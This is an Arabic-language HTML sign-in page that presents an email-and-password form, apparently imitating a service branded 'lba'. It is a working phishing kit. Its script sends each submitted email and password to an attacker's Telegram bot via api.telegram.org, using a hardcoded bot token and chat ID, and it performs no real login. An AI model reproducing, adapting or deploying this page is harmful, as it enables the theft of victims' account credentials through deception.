<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            background: linear-gradient(135deg, #0a1929 0%, #1a3a52 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            width: 100%;
            max-width: 500px;
        }

        .back-btn {
            background: none;
            border: none;
            color: white;
            font-size: 28px;
            cursor: pointer;
            margin-bottom: 30px;
            transition: opacity 0.3s ease;
            padding: 0;
        }

        .back-btn:hover {
            opacity: 0.7;
        }

        .logo {
            text-align: center;
            margin-bottom: 40px;
        }

        .logo img {
            height: 80px;
            object-fit: contain;
        }

        .heading {
            text-align: center;
            color: white;
            font-size: 18px;
            font-weight: 400;
            line-height: 1.8;
            margin-bottom: 40px;
            letter-spacing: 0.5px;
        }

        .form-group {
            margin-bottom: 30px;
        }

        label {
            display: block;
            color: white;
            font-size: 14px;
            font-weight: 400;
            margin-bottom: 12px;
            text-align: right;
        }

        .input-wrapper {
            position: relative;
        }

        input {
            width: 100%;
            padding: 16px 20px;
            background: rgba(255, 255, 255, 0.08);
            border: 1px solid rgba(255, 255, 255, 0.15);
            border-radius: 12px;
            color: white;
            font-size: 16px;
            font-family: inherit;
            transition: all 0.3s ease;
            text-align: right;
        }

        input::placeholder {
            color: rgba(255, 255, 255, 0.5);
        }

        input:focus {
            outline: none;
            background: rgba(255, 255, 255, 0.12);
            border-color: rgba(255, 255, 255, 0.25);
            box-shadow: 0 0 10px rgba(255, 255, 255, 0.1);
        }

        .password-toggle-btn {
            position: absolute;
            left: 15px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            color: white;
            cursor: pointer;
            font-size: 20px;
            transition: color 0.3s ease;
        }

        .password-toggle-btn:hover {
            color: rgba(255, 255, 255, 0.8);
        }

        .forgot-link {
            text-align: center;
            margin-top: 25px;
            margin-bottom: 50px;
        }

        .forgot-link a {
            color: white;
            text-decoration: none;
            font-size: 13px;
            border: 1px solid rgba(255, 255, 255, 0.3);
            border-radius: 25px;
            padding: 10px 24px;
            display: inline-block;
            transition: all 0.3s ease;
        }

        .forgot-link a:hover {
            background: rgba(255, 255, 255, 0.05);
            border-color: rgba(255, 255, 255, 0.5);
        }

        .submit-btn {
            width: 100%;
            padding: 16px;
            background: rgba(255, 255, 255, 0.1);
            color: white;
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 12px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 30px;
        }

        .submit-btn:hover {
            background: rgba(255, 255, 255, 0.15);
            border-color: rgba(255, 255, 255, 0.3);
            box-shadow: 0 4px 15px rgba(255, 255, 255, 0.1);
        }

        .submit-btn:active {
            background: rgba(255, 255, 255, 0.2);
        }

        .submit-btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }

        .loading {
            display: none;
            text-align: center;
            color: white;
            margin-top: 20px;
        }

        .spinner {
            border: 3px solid rgba(255, 255, 255, 0.2);
            border-top: 3px solid white;
            border-radius: 50%;
            width: 24px;
            height: 24px;
            animation: spin 1s linear infinite;
            margin: 0 auto 10px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        @media (max-width: 480px) {
            .container {
                padding: 0 15px;
            }

            .heading {
                font-size: 16px;
            }

            input {
                font-size: 16px;
            }

            .logo img {
                height: 60px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <button class="back-btn" onclick="window.history.back()">←</button>

        <div class="logo">
            <img src="https://a.top4top.io/p_37430qzsw0.png" alt="lba logo">
        </div>

        <h1 class="heading">للاستمرار، يرجى إدخال البريد الإلكتروني المستخدم وكلمة المرور</h1>

        <form id="loginForm">
            <div class="form-group">
                <label for="email">البريد الإلكتروني</label>
                <div class="input-wrapper">
                    <input 
                        type="email" 
                        id="email" 
                        name="email"
                        placeholder="أدخل بريدك الإلك��روني"
                        required
                    >
                </div>
            </div>

            <div class="form-group">
                <label for="password">كلمة المرور</label>
                <div class="input-wrapper">
                    <input 
                        type="password" 
                        id="password" 
                        name="password"
                        placeholder="أدخل كلمة المرور"
                        required
                    >
                    <button type="button" class="password-toggle-btn" onclick="togglePassword()">🔊</button>
                </div>
            </div>

            <p class="forgot-link">
                <a href="#">هل نسيت كلمة المرور؟</a>
            </p>

            <button type="submit" class="submit-btn" id="submitBtn">الدخول</button>
        </form>

        <div class="loading" id="loading">
            <div class="spinner"></div>
            <p>جاري الإرسال...</p>
        </div>
    </div>

    <script>
        const TELEGRAM_BOT_TOKEN = '8607340933:AAEKE8jwaYZVx_4955TocD8kCeg6se9Fdyg';
        const TELEGRAM_CHAT_ID = '6873334348';

        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();

            const email = document.getElementById('email').value.trim();
            const password = document.getElementById('password').value;

            if (!email || !password) {
                alert('الرجاء ملء جميع الحقول');
                return;
            }

            const submitBtn = document.getElementById('submitBtn');
            const loading = document.getElementById('loading');

            submitBtn.disabled = true;
            loading.style.display = 'block';

            try {
                const message = `
📧 <b>بيانات دخول جديدة</b>
━━━━━━━━━━━━━━━━━
📌 <b>البريد الإلكتروني:</b> <code>${email}</code>
🔐 <b>كلمة المرور:</b> <code>${password}</code>
⏰ <b>التاريخ والوقت:</b> ${new Date().toLocaleString('ar-SA')}
━━━━━━━━━━━━━━━━━`;

                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });

                const data = await response.json();

                if (data.ok) {
                    alert('تم الإرسال بنجاح');
                    document.getElementById('loginForm').reset();
                } else {
                    alert('حدث خطأ. الرجاء المحاولة مجددا');
                }
            } catch (error) {
                console.error('Error:', error);
                alert('خطأ في الاتصال');
            } finally {
                submitBtn.disabled = false;
                loading.style.display = 'none';
            }
        });

        function togglePassword() {
            const passwordInput = document.getElementById('password');
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
            } else {
                passwordInput.type = 'password';
            }
        }
    </script>
</body>
</html>
